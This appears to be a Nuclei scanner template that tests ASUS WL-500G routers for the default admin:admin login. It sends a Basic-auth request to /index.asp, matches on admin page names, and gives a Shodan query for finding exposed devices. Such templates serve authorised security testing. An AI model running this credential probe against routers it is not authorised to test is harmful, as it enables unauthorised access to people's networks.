http:
- attack: pitchfork
  matchers:
  - negative: true
    part: body
    type: word
    words:
    - 401 Unauthorized
  - condition: and
    part: body
    type: word
    words:
    - '"Main_Index_AccessPoint.asp'
    - Main_List.asp
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'GET /index.asp HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
id: asus-wl500g-default-login
info:
  author: ritikchaddha
  description: 'ASUS WL-500 contains a default login vulnerability. Default admin
    login password ''admin'' was found.

    '
  metadata:
    max-request: 1
    shodan-query: WL-500G
    verified: true
  name: ASUS WL-500G - Default Login
  severity: high
  tags: default-login,asus,wl-500
